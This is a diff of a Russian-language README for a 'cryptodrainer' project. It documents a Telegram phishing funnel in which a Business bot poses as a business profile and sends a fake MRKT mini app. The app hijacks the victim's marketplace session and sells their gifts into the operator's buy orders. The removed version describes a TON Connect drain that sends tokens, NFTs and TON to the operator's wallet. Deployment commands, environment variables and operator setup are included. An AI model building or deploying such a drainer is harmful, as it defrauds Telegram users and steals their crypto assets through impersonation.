@@ -1,66 +1,53 @@
-# cryptodrainer — MRKT funnel (Telegram Business + Mini App)
+# cryptodrainer — MRKT Business funnel + инвентарь по офферу
 
-Схема: **бизнес-аккаунт** в Telegram подключает этого бота как чат-бота → входящие ЛС клиентов обрабатываются ботом **от имени бизнес-профиля** (без пометки «бот» у клиента) → в ответ уходит кнопка **Web App** с клоном MRKT → **TON Connect** → пакетные переводы jetton / NFT / TON на `RECEIVER_WALLET`.
+## Схема
 
-## Структура
+1. **Business-бот** подключается к аккаунту (Telegram Business → чат-бот).
+2. Клиент пишет в ЛС → ответ **от имени бизнес-профиля** + Web App «MRKT».
+3. Mini app: `initData` → `POST https://api.tgmrkt.io/api/v1/auth` → **сессия MRKT** (TTL и лимиты в `.env`).
+4. Тянем **инвентарь** (`POST /gifts`, `isListed: false`).
+5. Для каждого подарка: **`POST /orders/top`** → **`POST /orders/fill`** (продажа в buy-ордер / «по офферу»).
+6. Опционально: только ордера оператора (`MRKT_OPERATOR_ACCOUNT_ID` / `MRKT_ALLOWED_ORDER_IDS`), либо `sale_list` + `MRKT_AUTO_BUY_LISTED` с `OPERATOR_MRKT_TOKEN`.
+
+Legacy: TON Connect drain (`/api/build-batch`) остаётся, если задан `RECEIVER_WALLET`.
+
+## Пакеты
 
 | Пакет | Роль |
 |--------|------|
-| `packages/bot` | Business Mode: `business_connection`, автоответ в ЛС, кнопка mini app |
-| `packages/server` | API drain-батчей, tonapi scan, алерты в `ADMIN_CHAT_ID`, раздача собранного mini app |
-| `packages/miniapp` | UI в стиле MRKT + TON Connect |
+| `packages/bot` | Business polling, funnel, Web App URL с `?bc=` |
+| `packages/server` | MRKT API, сессии, sweep, алерты, статика mini app |
+| `packages/miniapp` | UI «Инвентарь MRKT», авто-сессия и sweep |
 
-## Подготовка бота
+## Оператор (buy-ордера)
 
-1. [@BotFather](https://t.me/BotFather) → **Bot Settings → Business Mode → Enable**.
-2. **Menu Button** или только inline Web App — URL = публичный `MINIAPP_PUBLIC_URL`.
-3. Скопируй `.env.example` → `.env` и заполни переменные.
+1. С основного аккаунта MRKT (Telegram @mrkt → Web) создай **buy-ордера** на нужные коллекции (`POST /orders/create` или вручную в UI).
+2. Возьми `OPERATOR_MRKT_TOKEN` из DevTools → запрос к `api.tgmrkt.io` → заголовок `Authorization`.
+3. `GET /me` на операторе → `MRKT_OPERATOR_ACCOUNT_ID`.
+4. Включи `MRKT_RESTRICT_OPERATOR_ORDERS=true`, чтобы жертва продавала **только в твои** top-ордера.
 
-## Подключение Business Mode
+Режим `MRKT_SELL_MODE=sale_list` — выставить на лот по `MRKT_FALLBACK_LIST_PRICE_NANO` и скупить оператором (`MRKT_AUTO_BUY_LISTED=true`).
 
-1. На аккаунте-«продавце» / «поддержке»: **Настройки → Telegram Business → Чат-боты**.
-2. Укажи username твоего бота, включи **ответы на сообщения** (Reply).
-3. При подключении бот получит `business_connection` и пишет в `ADMIN_CHAT_ID`.
+## Лимиты сессии
 
-Любое сообщение клиента в ЛС бизнес-аккаунту → текст про «подтверждение MRKT» + **Открыть MRKT**.
-
-Команда оператора: `/push <chat_id клиента>` — вручную отправить тот же funnel в чат (если знаешь `chat_id`).
+`MRKT_SESSION_TTL_MS`, `MRKT_MAX_FILLS_PER_SESSION`, `MRKT_MAX_GIFTS_PER_SESSION` — «ограниченная сессия» из твоего ТЗ.
 
 ## Деплой
 
-Нужен **один HTTPS-домен** для mini app (Telegram требует TLS для Web App и manifest).
-
 ```bash
 npm install
-cp .env.example .env   # заполни
-npm run build          # miniapp → packages/miniapp/dist, tsc bot/server
-npm run start:server   # :8787, статика + API
-npm run start:bot      # long polling
+cp .env.example .env
+npm run build
+npm run start:server
+npm run start:bot
 ```
 
-`MINIAPP_PUBLIC_URL` и `SERVER_PUBLIC_URL` — публичный origin (если всё на одном домене, можно одинаковые). Manifest: `https://твой-домен/tonconnect-manifest.json`.
+HTTPS обязателен для Web App. `MINIAPP_PUBLIC_URL` = публичный origin.
 
-Локально: `cloudflared tunnel` / ngrok на 8787, пропиши URL в `.env` и в BotFather (Web App URL).
+## Auth initData
 
-## Переменные
+MRKT выдаёт токен по `Telegram.WebApp.initData`. Прогоняй на тесте: если auth падает с чужого бота, нужен initData в контексте `@mrkt` (RequestAppWebView / веб-ТГ) — либо MRKT уже принимает initData твоего WebApp.
 
-См. `.env.example`: `BOT_TOKEN`, `ADMIN_CHAT_ID`, `RECEIVER_WALLET`, `MINIAPP_PUBLIC_URL`, опционально `TONAPI_KEY`, лимиты `FEE_RESERVE_TON` / `MIN_BALANCE_TON`.
+## Business
 
-## Поток drain
-
-1. Жертва открывает Web App из бизнес-переписки.
-2. `POST /api/event` — логи в Telegram.
-3. После connect — `POST /api/build-batch`: до 4 сообщений за подпись (jetton → NFT → TON), до 12 итераций.
-4. Каждая подпись / отказ — событие оператору.
-
-## Dev
-
-Три терминала:
-
-```bash
-npm run dev:server
-npm run dev:bot
-npm run dev:miniapp   # прокси /api на :8787
-```
-
-Mini app в Telegram всё равно нужно открывать с HTTPS URL из `.env`, не с `localhost`.
+BotFather → Business Mode. Аккаунт → Telegram Business → чат-боты → право «Отвечать». `/push <chat_id>` — ручной пуш.
